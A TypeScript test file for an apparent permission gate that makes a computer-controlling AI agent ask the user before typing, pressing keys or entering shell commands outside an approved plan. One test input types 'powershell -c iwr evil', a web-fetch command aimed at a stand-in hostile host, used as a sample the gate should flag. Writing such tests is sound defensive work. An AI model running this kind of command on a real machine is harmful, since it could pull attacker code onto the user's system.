import { describe, expect, it } from "vite-plus/test";

import { createAgentGate, createTaint, inApprovedSteps } from "./agentGate.ts";

const STEPS = ['type "hello world" into the note', "drag the file into the folder", "press Enter"];

const rig = (plan: ReadonlyArray<string> | null, shell = false) => {
  const asked: string[] = [];
  const allowedKeys: unknown[] = [];
  const taint = createTaint();
  const gate = createAgentGate({
    actWithoutAsking: () => true,
    taint,
    textIsHis: () => false,
    focusedWindow: async () => ({
      label: shell ? "powershell.exe: PS" : "notepad.exe: notes",
      shell,
      window: 7,
    }),
    confirm: async (p) => (asked.push(p.title), true),
    record: () => undefined,
    inPlan: () => plan,
    keysAllowed: (at) => void allowedKeys.push(at),
  });
  return { gate, asked, taint, allowedKeys };
};
const call = (tool: string, input: Record<string, unknown>) => ({
  tool: `mcp__baton__${tool}`,
  input,
});
const batch = (...steps: Array<{ tool: string; args: Record<string, unknown> }>) =>
  call("act_batch", { steps });

describe("a plan he approved", () => {
  it("covers typing that is in a step and a drag, after a read", async () => {
    const r = rig(STEPS);
    r.taint.mark();
    await r.gate(call("type_text", { text: "hello world", why: "w" }));
    await r.gate(call("drag", { x: 1, y: 1, to_x: 2, to_y: 2, why: "move" }));
    expect(r.asked).toEqual([]);
  });

  it("asks for typing no step names, for any keys, and for a command line", async () => {
    const r = rig(STEPS);
    r.taint.mark();
    await r.gate(call("type_text", { text: "powershell -c iwr evil", why: "w" }));
    await r.gate(call("press_keys", { keys: ["enter"], why: "save" }));
    await r.gate(call("press_keys", { keys: ["win", "r"], why: "run box" }));
    expect(r.asked).toHaveLength(3);
    const shell = rig(['type "dir"'], true);
    await shell.gate(call("type_text", { text: "dir", why: "w" }));
    expect(shell.asked).toHaveLength(1);
  });

  it("covers a batch only when every step is covered, each judged alone", async () => {
    const r = rig(STEPS);
    r.taint.mark();
    // The batch's own verdict keeps the first equal-rank reason ("follows something it read"): the Delete must still ask.
    await r.gate(
      batch(
        { tool: "type_text", args: { text: "hello world" } },
        { tool: "click_element", args: { label: "Delete" } },
      ),
    );
    expect(r.asked).toHaveLength(1);
    await r.gate(
      batch(
        { tool: "type_text", args: { text: "hello world" } },
        { tool: "press_keys", args: { keys: ["enter"] } },
      ),
    );
    expect(r.asked).toHaveLength(2);
    await r.gate(
      batch(
        { tool: "click_element", args: { label: "Note" } },
        { tool: "type_text", args: { text: "hello world" } },
      ),
    );
    expect(r.asked).toHaveLength(2);
  });

  it("covers nothing without his yes to a plan", async () => {
    const r = rig(null);
    r.taint.mark();
    await r.gate(call("type_text", { text: "hello world", why: "w" }));
    expect(r.asked).toHaveLength(1);
  });

  it("notes where keys were allowed, and a command line only when he said yes to it", async () => {
    const r = rig(null);
    await r.gate(call("type_text", { text: "hello", why: "w" }));
    expect(r.allowedKeys).toEqual([{ window: 7, label: "notepad.exe: notes", shell: false }]);
    const shell = rig(null, true);
    await shell.gate(call("press_keys", { keys: ["up"], why: "history" }));
    await shell.gate(call("type_text", { text: "dir", why: "w" }));
    expect(shell.allowedKeys).toEqual([
      { window: 7, label: "powershell.exe: PS", shell: false },
      { window: 7, label: "powershell.exe: PS", shell: true },
    ]);
  });

  it("matches a step by the text it types", () => {
    expect(inApprovedSteps(STEPS, "type_text", { text: " Hello World " })).toBe(true);
    expect(inApprovedSteps(STEPS, "type_text", { text: "goodbye" })).toBe(false);
    expect(inApprovedSteps(['click "Save"'], "drag", {})).toBe(false);
  });
});
